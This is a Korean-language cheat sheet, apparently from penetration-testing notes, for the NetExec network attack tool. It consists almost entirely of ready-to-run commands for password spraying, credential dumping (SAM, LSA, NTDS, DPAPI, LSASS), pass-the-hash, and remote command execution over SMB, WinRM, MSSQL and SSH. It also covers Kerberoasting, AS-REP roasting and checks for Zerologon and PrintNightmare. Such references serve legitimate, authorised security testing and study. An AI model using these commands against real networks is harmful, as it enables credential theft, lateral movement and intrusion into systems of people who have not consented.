---
sidebar_position: 7
---

# NetExec

> https://github.com/Pennyw0rth/NetExec

> https://www.netexec.wiki/

강력한 네트워크 침투 테스트 도구 (CrackMapExec 후속)입니다.

## 설치

```bash
# pipx로 설치 (권장)
pipx install netexec

# pip로 설치
pip install netexec

# apt (Kali)
sudo apt install netexec
```

## 기본 사용법

```bash
netexec <PROTOCOL> <TARGET> -u <USER> -p <PASS>
```

## 지원 프로토콜

```bash
smb       # SMB/CIFS
ldap      # LDAP
winrm     # WinRM
mssql     # MSSQL
ssh       # SSH
ftp       # FTP
rdp       # RDP
wmi       # WMI
vnc       # VNC
```

## SMB 프로토콜

### 기본 인증

```bash
# 비밀번호 인증
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec smb <RHOST> -u 'admin' -p 'Password123'

# NTLM 해시
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>'
netexec smb <RHOST> -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# 로컬 인증
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
```

### Null Session

```bash
netexec smb <RHOST> -u '' -p ''
netexec smb <RHOST> -u ' ' -p ' '
```

### Guest 계정

```bash
netexec smb <RHOST> -u 'Guest' -p ''
```

### 비밀번호 스프레이

```bash
# 단일 비밀번호
netexec smb <RHOST> -u users.txt -p 'Password123'

# 여러 비밀번호
netexec smb <RHOST> -u users.txt -p passwords.txt --no-bruteforce

# 계속 진행 (성공 후에도)
netexec smb <RHOST> -u users.txt -p passwords.txt --continue-on-success
```

### 공유 열거

```bash
# 공유 목록
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares

# 디렉토리 목록
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --dir

# 특정 폴더
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --dir "Documents"
```

### 파일 다운로드

```bash
# Spider로 파일 목록
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus

# 파일 다운로드
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=true

# 특정 파일
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\path\\to\\file.txt ./file.txt
```

### 파일 업로드

```bash
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /local/file.txt \\remote\\path\\file.txt
```

### 사용자 열거

```bash
# 사용자 목록
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users

# 그룹 목록
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups

# 로컬 그룹
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-group

# 로그온 사용자
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
```

### RID 브루트포스

```bash
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute | grep 'SidTypeUser'
```

### 자격증명 덤프

```bash
# SAM
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam

# LSA
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa

# NTDS (DC)
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds

# DPAPI
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
```

### 명령 실행

```bash
# 단순 명령
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x 'whoami'
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x 'ipconfig'

# PowerShell
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X 'Get-Process'
```

### 모듈 사용

```bash
# 모듈 목록
netexec smb -L

# 특정 모듈
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
```

## LDAP 프로토콜

### 기본 인증

```bash
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec ldap <RHOST> -u '<USERNAME>' -H '<HASH>'
```

### 도메인 열거

```bash
# 사용자
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users

# 활성 사용자
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users

# 그룹
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups

# Admin Count
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
```

### BloodHound

```bash
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
```

### ASREPRoast

```bash
netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.txt
netexec ldap <RHOST> -u users.txt -p '' --asreproast hashes.txt
```

### Kerberoasting

```bash
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.txt
```

### GMSA 비밀번호

```bash
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
```

## WinRM 프로토콜

```bash
# 인증
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>'

# 명령 실행
netexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x 'whoami'
```

## MSSQL 프로토콜

```bash
# 인증
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>'

# 쿼리 실행
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -q 'SELECT @@version'

# xp_cmdshell
netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x 'whoami'
```

## SSH 프로토콜

```bash
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
netexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x 'id'
```

## Kerberos 인증

```bash
# 티켓 생성
netexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --generate-tgt /tmp/ticket.ccache
export KRB5CCNAME=/tmp/ticket.ccache

# Kerberos 사용
netexec smb <RHOST> -u <USERNAME> -k --use-kcache
```

## 취약점 스캐닝

```bash
# MS17-010 (EternalBlue)
netexec smb <RHOST> -u '' -p '' -M ms17-010

# SMBGhost
netexec smb <RHOST> -u '' -p '' -M smbghost

# Zerologon
netexec smb <RHOST> -u '' -p '' -M zerologon

# PrintNightmare
netexec smb <RHOST> -u '' -p '' -M printnightmare

# noPAC
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac
```

## 데이터베이스

```bash
# 자격증명 저장
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'

# 데이터베이스 위치
~/.nxc/workspaces/default/smb.db

# cmedb 사용
cmedb
```

## 유용한 옵션

```bash
-d <DOMAIN>         # 도메인
-k                  # Kerberos
--local-auth        # 로컬 인증
--no-bruteforce     # 브루트포스 안함
--continue-on-success  # 성공 후에도 계속
-M <MODULE>         # 모듈 사용
-o <OPTIONS>        # 모듈 옵션
--shares            # 공유 열거
--sam               # SAM 덤프
--lsa               # LSA 덤프
--ntds              # NTDS 덤프
-x <COMMAND>        # CMD 명령
-X <COMMAND>        # PowerShell 명령
```

## 참고

- CrackMapExec (CME)의 후속 버전
- 여러 프로토콜 지원
- 모듈로 확장 가능
- 데이터베이스에 결과 저장
- BloodHound 데이터 수집 가능
- Pass-the-Hash 지원
- Kerberos 인증 지원
- 대규모 네트워크 스캔에 적합
